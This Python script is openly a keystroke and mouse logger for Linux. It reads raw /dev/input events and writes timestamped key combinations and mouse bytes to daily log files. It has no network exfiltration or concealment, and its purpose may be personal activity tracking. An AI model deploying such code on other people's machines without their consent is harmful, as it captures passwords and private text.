# key dictionary
with open('./mykeyboard.txt') as f:
    lines = f.readlines()
KEY_DICTIONARY = { 0x00:'NULL' }
for line in lines:
    mapping = line.replace('\n','').split(' ')
    key  = int(mapping[0])
    code = mapping[1].lower()
    if len(code)>1:
        code = '[{0}]'.format(code)
    KEY_DICTIONARY[key] = code

### logging
import threading, time, datetime, struct, os

def ScanCodeToKeyCode(aCode):
    if aCode in KEY_DICTIONARY:
        return KEY_DICTIONARY[aCode]
    return '[unknown]'
    
def get_input_file(inputName):
    path = "/dev/input"
    for fname in os.listdir(path):
        fname = path + "/" + fname
        if os.path.isdir(fname) and ("by" in fname):
            path = fname
            break
    for fname in os.listdir(path):
        fname = path + "/" + fname
        if inputName in fname:
            return fname
    return None
    
def logKeys(self):
    pressedKeys = []
    while self.keep_running:
        row = self.eventFile.read(8)
        
        if 1 == row[0]:
            scanCode = row[2]
            keyCode = ScanCodeToKeyCode(scanCode)
            
            if 1 == row[4]:
                # key-down event
                pressedKeys.append(keyCode)
            if 0 == row[4]:
                # key-up event
                if keyCode in pressedKeys:
                    pressedKeys.remove(keyCode)
            
            keys = ''.join(pressedKeys)
            timeNow = time.time()
            logText = '{0:1.3f},{1}\n'.format(timeNow,keys)
            if self.previousKeys != keys and not self.f.closed:
                self.f.write(logText)
                self.previousKeys = keys
    
def logMouse(self):
    while self.keep_running:
        row = self.eventFile.read(3)
        timeNow = time.time()
        logText = '{0:1.3f},'.format(timeNow)
        for each in row:
            logText += str(int(each))+','
        logText+='\n'
        if not self.f.closed:
            self.f.write(str(logText))
            self.previousTime = timeNow
                
class keylogging_thread(threading.Thread):
    # Override Thread's __init__ method to accept the parameters needed:
    def __init__ ( self, inputName=None, loggerFunc=None ):
        self.inputName = inputName
        self.eventFile = open(get_input_file(self.inputName), "rb")
        self.loggerFunc = loggerFunc
        self.m_Clients = []
        threading.Thread.__init__ ( self )
        self.keep_running = True
        self.previousKeys = ''
        self.logFile = './data/log_{0}_{1}.txt'.format(
            self.inputName,
            str(datetime.date.today()))
        self.f = open(self.logFile, "a")
        
    def start(self):
        self.keep_running = True
        threading.Thread.start(self)
    def run ( self ):
        self.loggerFunc(self)
        
    def stop(self):
        self.f.close()
        self.keep_running = False
        
    def saveFile(self):
        self.f.close()
        self.logFile = './data/log_{0}_{1}.txt'.format(
            self.inputName,
            str(datetime.date.today()))
        self.f = open(self.logFile, "a")
    def register(self, client):
        self.m_Clients.append(client)

kl = keylogging_thread('kbd', logKeys)
ml = keylogging_thread('0-mouse', logMouse)

kl.start()
ml.start()
try:
    while True:
        now = datetime.datetime.now()
        tomorrow = datetime.datetime.fromordinal(datetime.date.today().toordinal()) + datetime.timedelta(days=1)
        waitingTime = (tomorrow-now).seconds
        kl.saveFile()
        ml.saveFile()
        time.sleep( waitingTime )
except:
    kl.stop()
    ml.stop()
    raise